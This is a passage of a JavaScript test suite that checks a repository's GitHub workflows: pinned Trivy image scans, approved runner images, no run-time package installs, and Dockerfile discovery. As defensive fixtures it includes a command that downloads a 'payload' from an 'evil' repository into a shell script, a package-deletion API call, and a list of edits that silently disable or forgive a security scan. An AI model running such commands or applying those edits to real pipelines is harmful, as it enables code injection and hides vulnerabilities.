  assert.ok(downloadViolations(prune, "gh api repos/evil/repo/contents/payload --jq .content > p.sh").length);
  assert.ok(downloadViolations("w.yml", `gh api -X DELETE "/users/$OWNER/packages/container/$package/versions/$id"`).length, "gh api outside its file");
});

// #475: v0.14.0 was tagged before anyone had scanned its image, and the tag run then
// refused it for two fixable HIGH findings in the runtime base. Pull requests now run
// the same scan with the same pinned Trivy, in the read-only staging-image job: the
// image built from the pull request, and the arm64 child of the approved runtime base
// (the pull request builds amd64 only; a base-image finding is per platform).
//
// The two steps are held to their exact text, as the version check above is: a scan
// that is echoed, negated, skipped, redirected to another image or given other flags
// or TRIVY_* settings is a different text. The job's own switches are fixed too.
const PR_TRIVY_INSTALL = {
  name: "Install Trivy (pinned release, SHA-256 verified)",
  run: [
    "set -euo pipefail",
    'bash .github/scripts/fetch-verified.sh https://github.com/aquasecurity/trivy/releases/download/v0.70.0/trivy_0.70.0_Linux-64bit.tar.gz 8b4376d5d6befe5c24d503f10ff136d9e0c49f9127a4279fd110b727929a5aa9 "${RUNNER_TEMP}/trivy.tar.gz"',
    'mkdir -p "${RUNNER_TEMP}/trivy-bin"',
    'tar -xzf "${RUNNER_TEMP}/trivy.tar.gz" -C "${RUNNER_TEMP}/trivy-bin" trivy',
    '"${RUNNER_TEMP}/trivy-bin/trivy" --version',
    "",
  ].join("\n"),
};
const PR_TRIVY_SCAN = {
  name: "Scan the candidate image and the arm64 runtime base",
  env: { APPROVED_RUNTIME },
  run: [
    "set -euo pipefail",
    'cd "$(mktemp -d)"',
    '"${RUNNER_TEMP}/trivy-bin/trivy" image --image-src docker --severity CRITICAL,HIGH --exit-code 1 --ignore-unfixed open-model-gateway:staging',
    '"${RUNNER_TEMP}/trivy-bin/trivy" image --image-src remote --platform linux/arm64 --severity CRITICAL,HIGH --exit-code 1 --ignore-unfixed "${APPROVED_RUNTIME}"',
    "",
  ].join("\n"),
};
const PR_SCAN_JOB_IF = "github.event_name != 'push' || (github.ref != 'refs/heads/main' && !startsWith(github.ref, 'refs/tags/v'))";

function assertPullRequestScan(ci, image) {
  assert.deepEqual(ci.permissions, { contents: "read" });
  const job = ci.jobs["staging-image"];
  // Nothing on the job can skip it, forgive it, give it a write token or set TRIVY_*.
  assert.deepEqual(Object.keys(job).sort(), ["env", "if", "runs-on", "steps", "timeout-minutes"]);
  assert.equal(job.if, PR_SCAN_JOB_IF);
  assert.equal(job["runs-on"], "ubuntu-24.04", "the pinned Trivy binary is the amd64 one");
  assert.deepEqual(Object.keys(job.env).sort(), ["STAGING_CADDY_IMAGE", "STAGING_POSTGRES_IMAGE"]);
  const steps = stepsOf(job);
  // Checkout (no persisted token), BuildKit, build, then the scan: before any script
  // from the pull request runs on the runner.
  assert.deepEqual(steps.slice(0, 3).map(s => actionName(s.uses)), ["actions/checkout", "docker/setup-buildx-action", "docker/build-push-action"]);
  assert.equal(steps[0].with?.["persist-credentials"], false);
  assert.equal(steps[2].with.tags, "open-model-gateway:staging");
  assert.equal(steps[2].with.load, true);
  for (const s of steps.slice(0, 3)) assert.deepEqual(Object.keys(s).filter(k => k !== "uses" && k !== "with"), [], "no conditions on the steps before the scan");
  assert.deepEqual(steps[3], PR_TRIVY_INSTALL);
  assert.deepEqual(steps[4], PR_TRIVY_SCAN);
  // The same Trivy release and checksum, and the same policy, as the tag run.
  const tagRun = executable(image.jobs.verify);
  const pins = t => [...t.matchAll(/fetch-verified\.sh (https:\/\/github\.com\/aquasecurity\/trivy\/releases\/download\/\S+) ([0-9a-f]{64}) /g)].map(m => `${m[1]} ${m[2]}`);
  assert.equal(pins(tagRun).length, 2, "the tag run pins Trivy for amd64 and arm64");
  assert.deepEqual(pins(PR_TRIVY_INSTALL.run), pins(tagRun).filter(p => p.includes("Linux-64bit")));
  const scans = t => [...t.replace(/\\\n\s*/g, " ").matchAll(/trivy"? image\b[^\n]*/g)].map(m => m[0].trim().split(/\s+/));
  const policy = scan => ["--severity", "--exit-code", "--ignore-unfixed"].map(f => [f, f === "--ignore-unfixed" ? "" : scan[scan.indexOf(f) + 1]].join(" ")).join(" ");
  assert.equal(scans(tagRun).length, 1);
  assert.equal(policy(scans(tagRun)[0]), "--severity CRITICAL,HIGH --exit-code 1 --ignore-unfixed ");
  for (const scan of scans(PR_TRIVY_SCAN.run)) assert.equal(policy(scan), policy(scans(tagRun)[0]));
  assert.equal(scans(PR_TRIVY_SCAN.run).length, 2);
}

const pullRequestScanData = () => {
  const load = name => toData(parseStrict(readFileSync(join(workflowsDir, `${name}.yml`), "utf8"), `${name}.yml`));
  return { ci: load("ci"), image: load("image") };
};

test("pull requests scan the candidate image with the tag run's Trivy and policy (#475)", () => {
  const { ci, image } = pullRequestScanData();
  assertPullRequestScan(ci, image);
  // Trivy reads these from its working directory. None may exist: the tag run scans
  // from the checkout, and nothing here reviews their contents.
  for (const file of [".trivyignore", ".trivyignore.yaml", "trivy.yaml", "trivy.yml"]) assert.equal(existsSync(join(root, file)), false, `${file} would change what the scans report`);
});

test("fixtures: a pull-request scan that is skipped, forgiven, redirected or reconfigured is refused (#475)", () => {
  const { ci: original, image } = pullRequestScanData();
  const job = f => f.jobs["staging-image"], scan = f => job(f).steps[4];
  const mutations = [
    ["echoed scans", f => { scan(f).run = scan(f).run.replaceAll('"${RUNNER_TEMP}/trivy-bin/trivy" image', "echo trivy image"); }],
    ["negated scan", f => { scan(f).run = scan(f).run.replace('"${RUNNER_TEMP}/trivy-bin/trivy" image --image-src docker', '! "${RUNNER_TEMP}/trivy-bin/trivy" image --image-src docker'); }],
    ["forgiven scan", f => { scan(f).run = scan(f).run.replace("open-model-gateway:staging\n", "open-model-gateway:staging || true\n"); }],
    ["no errexit", f => { scan(f).run = scan(f).run.replace("set -euo pipefail", "set +e"); }],
    ["early exit", f => { scan(f).run = scan(f).run.replace('cd "$(mktemp -d)"', "exit 0"); }],
    ["scan from the checkout", f => { scan(f).run = scan(f).run.replace('cd "$(mktemp -d)"\n', ""); }],
    ["other scanners", f => { scan(f).run = scan(f).run.replaceAll("--ignore-unfixed", "--ignore-unfixed --scanners secret"); }],
    ["lower severity", f => { scan(f).run = scan(f).run.replaceAll("CRITICAL,HIGH", "CRITICAL"); }],
    ["daemon copy of the base", f => { scan(f).run = scan(f).run.replace("--image-src remote ", ""); }],
    ["amd64 base only", f => { scan(f).run = scan(f).run.replace("--platform linux/arm64 ", ""); }],
    ["another base", f => { scan(f).env.APPROVED_RUNTIME = `gcr.io/distroless/cc-debian13:nonroot@sha256:${"a".repeat(64)}`; }],
    ["TRIVY settings on the step", f => { scan(f).env.TRIVY_SCANNERS = "secret"; }],
    ["TRIVY settings on the job", f => { job(f).env.TRIVY_IGNOREFILE = "x"; }],
    ["step condition", f => { scan(f).if = "false"; }],
    ["forgiven step", f => { scan(f)["continue-on-error"] = true; }],
    ["another shell", f => { scan(f).shell = "bash {0}"; }],
    ["forgiven job", f => { job(f)["continue-on-error"] = true; }],
    ["job defaults", f => { job(f).defaults = { run: { shell: "bash {0}" } }; }],
    ["skipped job", f => { job(f).if = "false"; }],
    ["write token", f => { job(f).permissions = { packages: "write" }; }],
    ["a step before the scan", f => { job(f).steps.splice(3, 0, { run: "docker tag busybox open-model-gateway:staging" }); }],
    ["scan after the rehearsal", f => { const [install, run] = job(f).steps.splice(3, 2); job(f).steps.push(install, run); }],
    ["another Trivy", f => { job(f).steps[3].run = job(f).steps[3].run.replace("v0.70.0", "v0.69.0"); }],
    ["persisted checkout token", f => { delete job(f).steps[0].with; }],
    ["another image built", f => { job(f).steps[2].with.tags = "other:staging"; }],
  ];
  assertPullRequestScan(original, image);
  for (const [name, mutate] of mutations) {
    const fixture = structuredClone(original);
    mutate(fixture);
    assert.throws(() => assertPullRequestScan(fixture, image), { name: "AssertionError" }, name);
  }
});

// ---- runner images (#491) ----

// A floating label (`ubuntu-latest`) changes the operating system under a job without a commit.
// Only these exact images are approved; moving to a newer one is a reviewed change here.
const APPROVED_RUNNERS = new Set(["ubuntu-24.04", "ubuntu-24.04-arm"]);
const WORKFLOW_FILE = /^[A-Za-z0-9._-]+\.ya?ml$/;

// `files` are the workflow file names of the repository: a job may hand its work to one of
// them (its jobs are checked there) and to no other reusable workflow, whose runner the caller
// cannot see or constrain.
export function runnerViolations(file, data, files) {
  const jobs = data?.jobs;
  if (!jobs || typeof jobs !== "object" || Array.isArray(jobs) || Object.keys(jobs).length === 0) return [`${file}: a workflow needs a non-empty jobs mapping`];
  const violations = [];
  for (const [name, job] of Object.entries(jobs)) {
    const where = `${file}: job ${name}`;
    const runsOn = job?.["runs-on"];
    if (job?.uses !== undefined) {
      const local = typeof job.uses === "string" && job.uses.startsWith("./.github/workflows/") ? job.uses.slice("./.github/workflows/".length) : "";
      if (runsOn !== undefined) violations.push(`${where}: a reusable-workflow call must not name a runner`);
      else if (!WORKFLOW_FILE.test(local) || !files.includes(local)) violations.push(`${where}: only a workflow file of this checkout (./.github/workflows/<file>) may be called; another repository or commit chooses its own runner`);
      continue;
    }
    if (typeof runsOn !== "string") { violations.push(`${where}: runs-on must be one runner label written as a string`); continue; }
    if (APPROVED_RUNNERS.has(runsOn)) continue;
    if (runsOn !== "${{ matrix.runner }}") { violations.push(`${where}: runs-on '${runsOn}' is not an approved runner image (${[...APPROVED_RUNNERS].join(", ")})`); continue; }
    const matrix = job.strategy?.matrix;
    const keys = matrix && typeof matrix === "object" && !Array.isArray(matrix) ? Object.keys(matrix) : [];
    const include = matrix?.include;
    if (keys.length !== 1 || keys[0] !== "include" || !Array.isArray(include) || include.length === 0) { violations.push(`${where}: a matrix runner needs a literal strategy.matrix.include list and no other matrix key`); continue; }
    for (const leg of include) {
      const legKeys = leg && typeof leg === "object" && !Array.isArray(leg) ? Object.keys(leg) : [];
      if (legKeys.some(key => key.includes("${{")) || legKeys.filter(key => key.toLowerCase() === "runner").length !== 1) violations.push(`${where}: a matrix leg needs exactly one literal runner key`);
      else if (!APPROVED_RUNNERS.has(leg.runner)) violations.push(`${where}: matrix runner '${leg.runner}' is not an approved runner image`);
    }
  }
  return violations;
}

test("every workflow job runs on an approved, exact runner image (#491)", () => {
  const entries = readdirSync(workflowsDir);
  assert.deepEqual(entries.filter(f => !WORKFLOW_FILE.test(f)), [], "only .yml and .yaml files belong in .github/workflows");
  for (const expected of ["branch-images.yml", "ci.yml", "codeql.yml", "image.yml", "loadtest-image.yml", "oci-import.yml", "prune-dev-images.yml"]) assert.ok(entries.includes(expected), expected);
  const violations = entries.flatMap(f => runnerViolations(f, toData(parseStrict(readFileSync(join(workflowsDir, f), "utf8"), f)), entries));
  assert.deepEqual(violations, []);
});

test("the runner check refuses floating, self-hosted, computed and unlisted runners (#491)", () => {
  const files = ["image.yml"];
  const check = (job, more = {}) => runnerViolations("fixture.yml", { jobs: { ...more, j: job } }, files);
  const steps = [{ run: "true" }];
  const good = { "runs-on": "ubuntu-24.04", steps };
  const legs = [{ runner: "ubuntu-24.04" }, { runner: "ubuntu-24.04-arm" }];
  const matrix = include => ({ "runs-on": "${{ matrix.runner }}", strategy: { matrix: { include } }, steps });
  for (const job of [good, { "runs-on": "ubuntu-24.04-arm", steps }, { uses: "./.github/workflows/image.yml" }, matrix(legs)]) assert.deepEqual(check(job), []);
  for (const [name, job, reason] of [
    ["the floating label", { "runs-on": "ubuntu-latest", steps }, /not an approved runner image/],
    ["a newer image", { "runs-on": "ubuntu-26.04", steps }, /not an approved runner image/],
    ["another floating label", { "runs-on": "ubuntu-24.04-latest", steps }, /not an approved runner image/],
    ["trailing text", { "runs-on": "ubuntu-24.04 ", steps }, /not an approved runner image/],
    ["another case", { "runs-on": "Ubuntu-24.04", steps }, /not an approved runner image/],
    ["self-hosted", { "runs-on": "self-hosted", steps }, /not an approved runner image/],
    ["a label list", { "runs-on": ["ubuntu-24.04"], steps }, /one runner label written as a string/],
    ["a runner group", { "runs-on": { group: "g", labels: "ubuntu-24.04" }, steps }, /one runner label written as a string/],
    ["no runner", { steps }, /one runner label written as a string/],
    // Each expression sits beside a valid matrix, so only the expression itself can be refused.
    ["an input expression", { ...matrix(legs), "runs-on": "${{ inputs.runner }}" }, /not an approved runner image/],
    ["an expression with a fallback", { ...matrix(legs), "runs-on": "${{ matrix.runner || 'ubuntu-latest' }}" }, /not an approved runner image/],
    ["another matrix value", { ...matrix(legs), "runs-on": "${{ matrix.os }}" }, /not an approved runner image/],
    ["other spacing", { ...matrix(legs), "runs-on": "${{matrix.runner}}" }, /not an approved runner image/],
    ["a matrix runner without a matrix", { "runs-on": "${{ matrix.runner }}", steps }, /literal strategy\.matrix\.include/],
    ["a runner axis beside include", { "runs-on": "${{ matrix.runner }}", strategy: { matrix: { runner: ["ubuntu-latest"], include: legs } }, steps }, /literal strategy\.matrix\.include/],
    ["a computed matrix", { "runs-on": "${{ matrix.runner }}", strategy: { matrix: "${{ fromJSON(inputs.m) }}" }, steps }, /literal strategy\.matrix\.include/],
    ["an empty include", matrix([]), /literal strategy\.matrix\.include/],
    ["a floating first leg", matrix([{ runner: "ubuntu-latest" }, { runner: "ubuntu-24.04" }]), /matrix runner 'ubuntu-latest'/],
    ["a floating last leg", matrix([{ runner: "ubuntu-24.04" }, { runner: "ubuntu-latest" }]), /matrix runner 'ubuntu-latest'/],
    ["a leg without a runner", matrix([{ platform: "linux/amd64" }]), /exactly one literal runner key/],
    ["a leg with a list runner", matrix([{ runner: ["ubuntu-24.04"] }]), /matrix runner/],
    ["a leg with a second runner key", matrix([{ runner: "ubuntu-24.04", Runner: "ubuntu-latest" }]), /exactly one literal runner key/],
    ["a leg with an expression key", matrix([{ runner: "ubuntu-24.04", "${{ insert }}": "x" }]), /exactly one literal runner key/],
    ["a reusable call that also names a runner", { uses: "./.github/workflows/image.yml", "runs-on": "ubuntu-24.04" }, /must not name a runner/],
    ["a reusable workflow of another repository", { uses: `some-org/shared-ci/.github/workflows/lint.yml@${"0".repeat(40)}` }, /only a workflow file of this checkout/],
    ["this repository at another commit", { uses: `ncecere/open-model-gateway/.github/workflows/image.yml@${"0".repeat(40)}` }, /only a workflow file of this checkout/],
    ["a local workflow that does not exist", { uses: "./.github/workflows/missing.yml" }, /only a workflow file of this checkout/],
    ["a local path outside the workflows", { uses: "./.github/workflows/../../other/image.yml" }, /only a workflow file of this checkout/],
    ["a call without a target", { uses: null, steps }, /only a workflow file of this checkout/],
  ]) {
    assert.deepEqual(check(job).map(v => reason.test(v)), [true], name);
    assert.deepEqual(check(good, { first: job }).map(v => reason.test(v)), [true], `${name}, before a good job`);
    assert.deepEqual(runnerViolations("fixture.yml", { jobs: { j: good, last: job } }, files).map(v => reason.test(v)), [true], `${name}, after a good job`);
  }
  for (const [name, data] of [["no jobs", {}], ["jobs under another key", { Jobs: { j: good } }], ["an empty jobs mapping", { jobs: {} }], ["a jobs list", { jobs: [good] }]]) {
    assert.match(runnerViolations("fixture.yml", data, files).join(), /non-empty jobs mapping/, name);
  }
});

// Operating-system packages installed at run time are neither pinned nor verified, and the
// job fails whenever the runner cannot reach the mirrors (#491). A `run:` script is refused
// if any word of it is a package manager (whatever its arguments, and however the script is
// laid out over lines) or a Playwright option that calls one. A plain guard against the
// ordinary ways of writing an install: it does not see a script file a step runs, an action
// that installs packages, or a command name assembled by the shell.
const PACKAGE_MANAGERS = new Set(["apt-get", "apt", "aptitude", "apt-fast", "nala", "add-apt-repository", "dpkg", "snap", "apk", "yum", "dnf", "zypper", "pacman"]);
const PLAYWRIGHT_PACKAGES = ["install-deps", "--with-deps"];

// Every `run:` string anywhere in a parsed workflow or composite action.
const everyRunScript = node => (node && typeof node === "object"
  ? Object.entries(node).flatMap(([key, value]) => (key === "run" && typeof value === "string" ? [value] : everyRunScript(value)))
  : []);

export function packageInstallViolations(file, data) {
  return everyRunScript(data).flatMap(script => {
    const words = script.split(/[^A-Za-z0-9_.+-]+/).map(word => word.toLowerCase());
    const found = [...new Set(words.filter(word => PACKAGE_MANAGERS.has(word) || PLAYWRIGHT_PACKAGES.includes(word)))];
    return found.length ? [`${file}: a run step installs packages at run time (${found.join(", ")}): ${JSON.stringify(script.slice(0, 60))}`] : [];
  });
}

test("no workflow or composite action installs operating-system packages at run time (#491)", () => {
  const files = [...readdirSync(workflowsDir).map(f => join(workflowsDir, f)), ...walk(join(root, ".github/actions")).filter(f => /\.ya?ml$/.test(f))];
  const scripts = files.map(f => everyRunScript(toData(parseStrict(readFileSync(f, "utf8"), f))).length);
  assert.ok(scripts.reduce((a, b) => a + b, 0) >= 40 && scripts.filter(n => n > 0).length >= 8, "the run steps of every workflow and the composite action are read");
  assert.deepEqual(files.flatMap(f => packageInstallViolations(f, toData(parseStrict(readFileSync(f, "utf8"), f)))), []);

  const check = run => packageInstallViolations("f.yml", { jobs: { first: { steps: [{ run: "true" }] }, j: { steps: [{ run: "echo ok" }, { name: "x", run }] } } });
  for (const run of [
    "sudo apt-get update && sudo apt-get install -y age",
    "sudo apt-get update",
    "sudo apt-get -y install age",
    "sudo apt-get -o Acquire::Retries=3 install -y age",
    "sudo -E apt-get -qq -o Dpkg::Use-Pty=0 install -y --no-install-recommends age",
    "DEBIAN_FRONTEND=noninteractive /usr/bin/apt-get install -y age",
    "sudo apt-get \\\n  install -y age",
    "set -e\nsudo apt-get\ninstall age\n",
    "apt install age",
    "sudo APT-GET install age",
    "sudo apt-get dist-upgrade",
    "sudo apt-get build-dep age",
    "sudo add-apt-repository ppa:x/y",
    "sudo dpkg -i x.deb",
    "sudo dpkg --install x.deb",
    "sudo snap install x",
    "apk add age",
    "sudo dnf install age",
    "sh -c 'apt-get install age'",
    "echo age | xargs sudo apt-get install -y",
    "npx playwright install --with-deps --only-shell chromium",
    "npx playwright install chromium --with-deps",
    "npx --yes playwright install-deps chromium",
  ]) assert.equal(check(run).length, 1, run);
  assert.equal(packageInstallViolations("action.yml", { runs: { using: "composite", steps: [{ run: "sudo apt-get install -y age", shell: "bash" }] } }).length, 1, "a composite action");
  assert.equal(check("sudo apt-get install -y age").length + packageInstallViolations("f.yml", { jobs: { a: { steps: [{ run: "apk add x" }] }, b: { steps: [{ run: "dnf install y" }] } } }).length, 3, "every step is reported");
  for (const run of ["npx playwright install --only-shell chromium", "npm ci", "cargo install --locked --path .", "adapt install", "echo snapshot aptly apt_get", "python3 -m pip install --require-hashes -r requirements.lock"]) {
    assert.deepEqual(check(run), [], run);
  }
  assert.deepEqual(packageInstallViolations("f.yml", { jobs: { j: { name: "never apt-get install here", steps: [{ name: "apt-get", uses: "x/y@z", with: { run: 1 } }] } } }), [], "only run scripts are read");
});

test("fixtures: the Dockerfile walker finds Dockerfile*, *.dockerfile and Containerfile* in any case, outside the skipped directories (#488)", () => {
  const dir = mkdtempSync(join(tmpdir(), "omg-walker-"));
  try {
    const unpinned = "FROM alpine:3\n";
    // No two names differ only in case, so the fixture also holds on a case-insensitive file system.
    const files = ["Dockerfile", "Dockerfile.release", "DOCKERFILE.dev", "app.dockerfile", "Containerfile", "containerfile.prod", "deploy/dockerfile", "deploy/x.Dockerfile", "deploy/sub/CONTAINERFILE",
      ".git/Dockerfile", "node_modules/p/Dockerfile", "target/Dockerfile", "target-wt/Containerfile", "apps/web/dist/Dockerfile", ".turbo/Dockerfile", "notes.txt", "Dockerfile-notes/README"];
    for (const file of files) { mkdirSync(join(dir, posix.dirname(file)), { recursive: true }); writeFileSync(join(dir, file), unpinned); }
    const found = findDockerfiles(dir).map(p => p.slice(dir.length + 1)).sort();
    assert.deepEqual(found, files.slice(0, 9).sort());
    // Each one found is checked: its unpinned base is reported.
    for (const file of found) assert.equal(unpinnedDockerfileBases(file, unpinned).length, 1, file);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("fixtures: a .dockerignore is not a Dockerfile, and an unknown Dockerfile name fails clearly (#488)", () => {
  const dir = mkdtempSync(join(tmpdir(), "omg-walker-"));
  try {
    for (const file of ["Dockerfile", "Dockerfile.dockerignore", "app.Dockerfile.dockerignore"]) writeFileSync(join(dir, file), "x\n");
    assert.deepEqual(findDockerfiles(dir).map(p => p.slice(dir.length + 1)), ["Dockerfile"]);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
  assert.match(unknownDockerfileViolations(["Dockerfile", "docs/Dockerfile.md"]).join(), /^docs\/Dockerfile\.md is named like a Dockerfile but is not one of the known Dockerfiles .*rename it/);
  assert.deepEqual(unknownDockerfileViolations([...KNOWN_DOCKERFILES]), []);
});
